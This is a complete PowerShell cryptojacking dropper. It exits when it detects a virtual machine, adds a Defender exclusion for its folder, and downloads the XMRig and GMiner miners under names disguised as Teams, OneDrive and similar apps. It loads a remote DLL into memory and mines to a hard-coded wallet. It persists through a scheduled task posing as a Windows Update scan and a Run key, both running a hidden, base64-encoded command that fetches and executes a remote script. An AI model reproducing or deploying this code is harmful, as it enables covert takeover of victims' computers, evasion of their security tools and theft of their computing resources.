$GithubUser = "HolyV200"
$RepoName = "ulta"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"

$ProcessNames = @("OneDriveStandalone", "TeamsDesktop", "ZoomManager", "DiscordUpdate", "EdgeBroker", "SpotifyHelper")
$Name1 = ($ProcessNames | Get-Random) + ".exe"
$Name2 = ($ProcessNames | Where-Object { $_ -ne $Name1 } | Get-Random) + ".exe"
$StealthDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"

# ANTI-SANDBOX GUARD
$Check = @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " "
if ($Check -match "VirtualBox" -or $Check -match "VMware" -or $Check -match "VIRTUAL") { exit }
if (Test-Path "C:\windows\System32\Drivers\VBoxMouse.sys") { exit }

function Get-StealthFile($Url, $Path) {
    $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
    try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $UA -ErrorAction Stop | Out-Null; return $true } catch { }
    try { curl.exe -L -H "User-Agent: $UA" -o $Path $Url 2>$null; return $true } catch { }
    try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path; return $true } catch { }
    return $false
}

if (-not (Test-Path $StealthDir)) { New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null }

try { powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c } catch { }

try {
    if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
    }
} catch { }

$CpuZip = Join-Path $StealthDir "upd_c.zip"
$GpuZip = Join-Path $StealthDir "upd_g.zip"
$CpuExe = Join-Path $StealthDir $Name1
$GpuExe = Join-Path $StealthDir $Name2

if (-not (Test-Path $CpuExe)) {
    if (Get-StealthFile $MinerUrl $CpuZip) {
        $shell = New-Object -ComObject Shell.Application
        $shell.NameSpace($StealthDir).CopyHere($shell.NameSpace($CpuZip).Items(), 0x10)
        Remove-Item $CpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
    }
}

# AGGRESSIVE GPU DETECTION (PRO-STRENGTH)
$GpuDetected = $false
try {
    $Cards = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($Card in $Cards) {
        $N = $Card.Name.ToUpper()
        if ($N -match "NVIDIA" -or $N -match "AMD" -or $N -match "RADEON" -or $N -match "RTX" -or $N -match "GTX" -or $Card.AdapterRAM -gt 2GB) {
            if ($N -notmatch "MICROSOFT BASIC" -and $N -notmatch "DISPLAY") { $GpuDetected = $true; break }
        }
    }
} catch { }

if ($GpuDetected -and -not (Test-Path $GpuExe)) {
    if (Get-StealthFile $GpuMinerUrl $GpuZip) {
        $shell = New-Object -ComObject Shell.Application
        $shell.NameSpace($StealthDir).CopyHere($shell.NameSpace($GpuZip).Items(), 0x10)
        Remove-Item $GpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
    }
}

$DllPath = Join-Path $StealthDir "Bridge.dll"
if (Get-StealthFile $DllUrl $DllPath) {
    try {
        $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
        $assembly = [System.Reflection.Assembly]::Load($dllBytes)
        $loader = $assembly.GetType("DateFundLoader")
        $startMethod = $loader.GetMethod("StartMiner")
        $GArg = if ($GpuDetected) { $GpuExe } else { "" }
        $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GArg, [string]$Wallet))
        
        $Command = "irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex"
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
        $Encoded = [Convert]::ToBase64String($Bytes)
        $TPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $Encoded"
        
        if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            schtasks.exe /create /tn "Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "$TPath" /sc onlogon /rl highest /f /ru "System"
        } else {
            schtasks.exe /create /tn "WindowsUpdateScan" /tr "$TPath" /sc onlogon /f
        }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value $TPath
    } catch { }
}